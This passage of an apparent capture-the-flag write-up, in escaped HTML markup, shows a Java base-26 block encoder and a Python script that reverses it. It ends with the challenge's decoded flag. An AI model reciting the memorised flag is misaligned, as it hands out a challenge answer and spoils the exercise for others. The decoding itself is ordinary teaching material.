&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;java&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Scanner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;numericalEncoder&lt;&#x2F;span&gt;&lt;span&gt;{ 
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;public static void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;){ 
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; alphabet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Scanner&lt;&#x2F;span&gt;&lt;span&gt; sc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Scanner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;in)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter string to be encoded: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; sc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;nextLine&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;		m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;toLowerCase&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter int block size: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; sc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;nextInt&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;padding to variable block size 
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;){ 
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;){ 
&lt;&#x2F;span&gt;&lt;span&gt;				m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;			}
&lt;&#x2F;span&gt;&lt;span&gt;		}
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;M after padding: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; m)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;Variable block size 
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;ArrayList&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Integer&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; encodedBlocks &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;ArrayList&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Integer&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; numBlocks &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt; r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; numBlocks&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;){ 
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; block &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;substring&lt;&#x2F;span&gt;&lt;span&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; r)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(block)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; power &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; representation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;length&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;                        	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt; currentLetter &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;substring&lt;&#x2F;span&gt;&lt;span&gt;(j&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;j&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                        	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; letterValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; alphabet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;indexOf&lt;&#x2F;span&gt;&lt;span&gt;(currentLetter)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                        	representation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span&gt; letterValue &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; power)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                        	power&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                	} 
&lt;&#x2F;span&gt;&lt;span&gt;			encodedBlocks&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(representation)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		}
&lt;&#x2F;span&gt;&lt;span&gt;	        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Encoded blocks are as follows: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;	
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; encodedBlocks){
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;System&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;println&lt;&#x2F;span&gt;&lt;span&gt;(num)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;		}
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The output of the above code is &lt;code&gt;SUPPLIES: 6639182 5837362 7923517 8463981 3588695 8358510&quot;&lt;&#x2F;code&gt; and this is the encoded vesion of our flag. So analyzed the code and reversed the encoding program.&lt;&#x2F;p&gt;
&lt;p&gt;My observations are, the above code is doing generating a integer for for a block of characters. That is &lt;code&gt;6639182&lt;&#x2F;code&gt; is on encoded version of a block of characters. This is generated by accessing the index of the character from alphabet string and this is multiplied &lt;code&gt;pow(26,power)&lt;&#x2F;code&gt; where &lt;code&gt;power=len(block)-1&lt;&#x2F;code&gt; and this power is decreased for every new character in the block.&lt;&#x2F;p&gt;
&lt;p&gt;Okay, lets have some math. lets assume block size = 4 &lt;br&gt;power = 3&lt;br&gt;the initial encoded block value will become&lt;br&gt; &lt;code&gt;index(char)x26^3 + index(char)x26^2 + index(char)x26^1 + index(char)x26^0&lt;&#x2F;code&gt;&lt;br&gt;
Simply it is doing a &lt;code&gt;base26&lt;&#x2F;code&gt; operation. So, in the decode program, we have to perform decoding of base26.&lt;&#x2F;p&gt;
&lt;p&gt;This is the solution script which can give the decoded message from encoded blocks.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;string
&lt;&#x2F;span&gt;&lt;span&gt;alphabet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;string&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;ascii_lowercase
&lt;&#x2F;span&gt;&lt;span&gt;input_str &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter numerical blocks to be decoded (separated by spaces): &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# split input into individual numerical blocks
&lt;&#x2F;span&gt;&lt;span&gt;input_blocks &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;input_str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;decoded_blocks &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;block &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;input_blocks:
&lt;&#x2F;span&gt;&lt;span&gt;    num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(block)
&lt;&#x2F;span&gt;&lt;span&gt;    decoded &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        remainder &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26
&lt;&#x2F;span&gt;&lt;span&gt;        decoded_letter &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;alphabet[remainder]
&lt;&#x2F;span&gt;&lt;span&gt;        decoded &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;decoded_letter &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;decoded
&lt;&#x2F;span&gt;&lt;span&gt;        num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26
&lt;&#x2F;span&gt;&lt;span&gt;    decoded_blocks&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(decoded)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# combine decoded blocks into original message
&lt;&#x2F;span&gt;&lt;span&gt;decoded_message &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(decoded_blocks)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Decoded message: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;decoded_message)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#6639182 5837362 7923517 8463981 3588695 8358510
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# onthemuddyriversnorthwestshore
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# jctf{onthemuddyriversnorthwestshore}
